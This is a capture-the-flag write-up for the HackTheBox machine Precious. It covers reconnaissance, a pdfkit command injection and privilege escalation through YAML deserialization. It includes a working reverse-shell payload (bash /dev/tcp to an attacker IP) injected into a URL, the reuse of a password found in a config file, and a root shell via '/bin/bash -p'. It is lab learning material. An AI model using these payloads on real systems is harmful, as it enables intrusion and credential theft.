# Precious.HTB-Write-Up
Write up report for the HackTheBox machine Precious.

-Initiated a service/network scan on the given HTB box with Nmap. `nmap -sV -sC 10.129.230.167`

![image](https://user-images.githubusercontent.com/61332852/226735722-c099909e-f7c7-4d18-a68b-b9c45b85dc47.png)


-Nmap shows that a HTTP (80) Port was open and an SSH(22) port as well. I first checked to see if there was any exploits pertaining to the services of the HTTP server that was hosting the website and as well as the SSH service running. I used the command `searchsploit` and as well searched online to double check that the results searchsploit was returning was accurate.  

![image](https://user-images.githubusercontent.com/61332852/226736215-366962c6-ee2b-488f-ad4f-17bad695c042.png)


-After seeing there was no obvious exploits to take advantage of the next step was browsing the website running. First, I added the IP to /etc/hosts file to actually access the website.   



The website consisted of an input box that took a URL as input and the website would output that URL as a PDF File. I began running Gobuster to see if there was anything other than what was given on the home page but returned no results of any other directories on the web server.   

After messing with the input box, I opened BurpSuite to see what the application was doing when inputting a URL. After inputting a couple different random websites, the application was returning nothing but a “Cannot load remote URL” message. Thus, I began to start my own python webserver on my localhost. Python3 -m http.server 80 

After doing so it had converted the webserver, I had spun up to a pdf file.  

I used exiftool to see if there was any information I can get out of behind the PDF file that was downloaded from the website. Which gave us the application that was converting the URL to PDF. 


I used the searchsploit command again here to see if there was anything it would find for ‘pdfkit v0.8.6’. It returned nothing as well so I went to google search to see if there were any vulnerabilities with the given application. Then found that it was vulnerable to command injection a type of injection vulnerability.     

Reading more of the vulnerability and what we can start to do to exploit it this is what I found. “An application could be vulnerable if it tries to render a URL that contains query string parameters with user input”. After using this information, we can modify the URL to take a command as input to see if the application will run the command.  
After grabbing a reverse shell command, I inserted it as a string within the URL http://10.10.14.66:8910/?name=#{'%20`bash -c 'exec bash -I &>/dev/tcp/10.10.14.66/4444 <&1'`'}. Thus, getting me in as the user “Ruby” within the webserver.  

Going through all the files and directories that were given I first went to the users home folder to see if the user flag was there but didn’t consist of anything. I then used ls -la to find something I don’t see usually which was a directory called ‘.bundle’ which I then found a config file consisting of another user’s password.  

I began to login as the user henry with the given password. Successfully getting us in. I first checked henrys home directory to check for any flags shown there. Then giving us our first flag.  

To start privilege escalation towards getting the root flag I first checked what permissions Henry had as root on the machine.  

After checking the file, I then researched if there were any vulnerabilities with the Yaml file that was given. Then later finding that the Yaml file was vulnerable to “Yaml Deserialization Attack” allowing us to run arbitrary code within the yaml file. We can now go look for an exploit to run in the dependency file to execute.
 

After running ‘sudo /usr/bin/ruby /opt/update_dependencies.rb’ we can now go and run ‘/bin/bash -p’ to see if get into root as the user.
  

Thus, going into roots home folder to retrieve the root flag of the machine.  
